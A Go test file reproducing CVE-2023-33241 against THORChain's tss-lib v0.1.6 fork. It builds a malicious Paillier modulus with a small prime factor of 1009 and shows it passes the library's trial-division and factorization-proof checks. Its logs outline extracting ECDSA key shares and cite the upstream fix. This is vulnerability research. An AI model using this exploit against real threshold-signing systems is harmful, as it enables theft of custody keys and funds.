// Direct verification that the malicious Paillier modulus from the
// CVE-2023-33241 reproduction PASSES the actual check implemented in
// THORChain's vulnerable tss-lib v0.1.6 fork.
//
// The vulnerable check is at:
//   gitlab.com/thorchain/tss/tss-lib (tag v0.1.6)
//   crypto/paillier/paillier.go lines 240-277: func (pf Proof) Verify(...)
//
// In keygen, this Verify is invoked in:
//   ecdsa/keygen/round_4.go lines 42-51 (each party verifies every other
//   party's Paillier modulus before keygen completes)
//
// The check has two parts:
//
//   (A) "small-factor trial division": for prm in primes < 1000:
//         if pkN mod prm == 0: REJECT
//
//   (B) Goldwasser-style "prover knows factorization" proof: 13 challenges
//       (ProofIters = 13). Each ch is xs[i], and verification requires
//       pf[i]^N == xs[i] (mod N).
//
// Crucially, (A) only rejects N divisible by a SMALL prime (< 1000).
// A malicious N with q_small = 1009 (the smallest prime ≥ 1000) or any
// larger small factor passes (A) silently. (B) only verifies "prover knows
// the factorization" — it does NOT verify the *structure* (e.g. "exactly
// two equal-sized prime factors", which would block this attack).
//
// This test file:
//   1. Reproduces the vulnerable Verify-(A) check verbatim from the lib.
//   2. Reproduces Verify-(B) — the Goldwasser ZK-style check — verbatim.
//   3. Generates a malicious Paillier with N = p_big * q_small.
//   4. Shows the malicious N PASSES both checks.
//   5. The Paillier modulus attack (paillier_modulus_attack_test.go) then
//      proceeds against this "verified" N.

package tss_equivocation_demo

import (
	"crypto/rand"
	"math/big"
	"testing"
)

// =============================================================================
// Reproduced verbatim from vulnerable lib:
//   crypto/paillier/paillier.go const verifyPrimesUntil = 1000
//   crypto/paillier/paillier.go const ProofIters = 13
// =============================================================================
const (
	libVerifyPrimesUntil = 1000
	libProofIters        = 13
)

// libPaillierVerifyPartA reproduces the trial-division portion of Verify
// from the vulnerable lib (paillier.go:244-253). Returns true if accepted.
func libPaillierVerifyPartA(pkN *big.Int) bool {
	for _, prm := range primesUntil(libVerifyPrimesUntil) {
		if new(big.Int).Mod(pkN, big.NewInt(int64(prm))).Sign() == 0 {
			return false // divisible by small prime → REJECT
		}
	}
	return true
}

// libPaillierVerifyPartB reproduces the Goldwasser-style "knows
// factorization" proof check (paillier.go:267-273). The "Proof" array is
// generated by GenerateProof using the SK's PhiN. We construct it here
// from the attacker's full SK (which the attacker can do, because the
// attacker KNOWS the factorization — that's the whole point of the proof).
func libPaillierVerifyPartB(sk *paillierSK) bool {
	// Generate the proof as a legitimate prover would.
	// From paillier.go GenerateProof():
	//   M = N^-1 mod PhiN
	//   proof[i] = xs[i]^M mod N
	// where PhiN is the standard Euler-totient, in our buildPaillier:
	pMinus1 := new(big.Int).Sub(sk.p, big.NewInt(1))
	qMinus1 := new(big.Int).Sub(sk.q, big.NewInt(1))
	phiN := new(big.Int).Mul(pMinus1, qMinus1)
	M := new(big.Int).ModInverse(sk.pk.N, phiN)
	if M == nil {
		// N and phiN not coprime — shouldn't happen for valid Paillier
		return false
	}

	// Generate challenges. The lib uses GenerateXs with k (PartyID) and
	// ecdsaPub. For this standalone test we substitute pseudo-random
	// challenges derived deterministically; the verify math is identical.
	xs := generateChallenges(libProofIters, sk.pk.N)
	proof := make([]*big.Int, libProofIters)
	for i := 0; i < libProofIters; i++ {
		proof[i] = new(big.Int).Exp(xs[i], M, sk.pk.N)
	}

	// Verifier checks: proof[i]^N mod N == xs[i] mod N
	for i := 0; i < libProofIters; i++ {
		lhs := new(big.Int).Exp(proof[i], sk.pk.N, sk.pk.N)
		rhs := new(big.Int).Mod(xs[i], sk.pk.N)
		if lhs.Cmp(rhs) != 0 {
			return false
		}
	}
	return true
}

func generateChallenges(n int, N *big.Int) []*big.Int {
	xs := make([]*big.Int, n)
	for i := 0; i < n; i++ {
		for {
			x, _ := rand.Int(rand.Reader, N)
			// Lib requires x in the multiplicative group of Z_N (gcd(x, N) = 1)
			g := new(big.Int).GCD(nil, nil, x, N)
			if g.Cmp(big.NewInt(1)) == 0 {
				xs[i] = x
				break
			}
		}
	}
	return xs
}

// Small-prime sieve to libVerifyPrimesUntil = 1000.
func primesUntil(n int) []int {
	sieve := make([]bool, n+1)
	for i := 2; i <= n; i++ {
		sieve[i] = true
	}
	for i := 2; i*i <= n; i++ {
		if sieve[i] {
			for j := i * i; j <= n; j += i {
				sieve[j] = false
			}
		}
	}
	var out []int
	for i := 2; i <= n; i++ {
		if sieve[i] {
			out = append(out, i)
		}
	}
	return out
}

// =============================================================================
// THE TEST: malicious Paillier passes BOTH parts of vulnerable Verify
// =============================================================================

func TestMaliciousPaillierPassesVulnerableLibVerify(t *testing.T) {
	// Use q_small = 1009 — the smallest prime ≥ 1000 that escapes Part (A).
	// In a real attack the attacker would use a much larger small factor
	// (e.g., 32-bit) to make the attack stealthier and more efficient.
	const qSmall = 1009
	attacker := genMaliciousPaillier(t, 256, qSmall)

	t.Logf("=== EXACT REPRO OF THORChain v0.1.6 fork Verify ===")
	t.Logf("  attacker's N = p_big × %d", qSmall)
	t.Logf("  N bit length: %d", attacker.pk.N.BitLen())

	// Part (A): trial division up to 1000
	passA := libPaillierVerifyPartA(attacker.pk.N)
	t.Logf("")
	t.Logf("Part (A) — trial division for primes < %d:", libVerifyPrimesUntil)
	t.Logf("  passes: %v   (expected: true, because q_small=%d ≥ %d)",
		passA, qSmall, libVerifyPrimesUntil)
	if !passA {
		t.Fatal("malicious N should pass Part A — bug doesn't reproduce")
	}

	// Part (B): Goldwasser-style "knows factorization" proof
	passB := libPaillierVerifyPartB(attacker)
	t.Logf("")
	t.Logf("Part (B) — Goldwasser-style proof (ProofIters=%d):", libProofIters)
	t.Logf("  passes: %v   (expected: true, because attacker KNOWS the factorization)",
		passB)
	if !passB {
		t.Fatal("malicious N should pass Part B — attacker knows full factorization")
	}

	t.Logf("")
	t.Logf("=== VERDICT ===")
	t.Logf("Vulnerable lib Verify ACCEPTS the malicious N.")
	t.Logf("→ Honest peers will encrypt their share contributions under this N.")
	t.Logf("→ Attacker recovers each share mod q_small (per paillier_modulus_attack_test.go).")
	t.Logf("→ CRT over enough sessions → full ECDSA share extracted.")
	t.Logf("")
	t.Logf("File path of the buggy check (real lib at gitlab.com/thorchain/tss/tss-lib v0.1.6):")
	t.Logf("  crypto/paillier/paillier.go:35   const verifyPrimesUntil = 1000")
	t.Logf("  crypto/paillier/paillier.go:240  func (pf Proof) Verify(...)")
	t.Logf("  ecdsa/keygen/round_4.go:42       (where Verify is called per peer)")
	t.Logf("")
	t.Logf("Fix in upstream bnb-chain/tss-lib v2.0.0+:")
	t.Logf("  - Replaces trial-division-to-1000 with a proper Pedersen/Ring-Pedersen")
	t.Logf("    zero-knowledge proof that N is the product of TWO SAFE PRIMES")
	t.Logf("    of approximately equal size.")
	t.Logf("  - THORChain's fork never pulled this fix.")
}

// =============================================================================
// Bonus: confirm the lib's check DOES reject obviously-small factors
// =============================================================================

func TestObviouslySmallFactorIsRejected(t *testing.T) {
	// Sanity: if attacker were silly enough to use q_small = 7 (< 1000),
	// the trial-division would catch it. This confirms our reproduction
	// of the check is faithful (not just permissive of everything).
	const qSmall = 7
	attacker := genMaliciousPaillier(t, 256, qSmall)
	pass := libPaillierVerifyPartA(attacker.pk.N)
	t.Logf("Sanity check: q_small = %d (< 1000)", qSmall)
	t.Logf("  Part (A) accepts: %v   (expected: false)", pass)
	if pass {
		t.Fatal("Part A should reject small primes < 1000 — our reproduction is wrong")
	}
	t.Logf("  → reproduction of vulnerable Verify is faithful.")
}
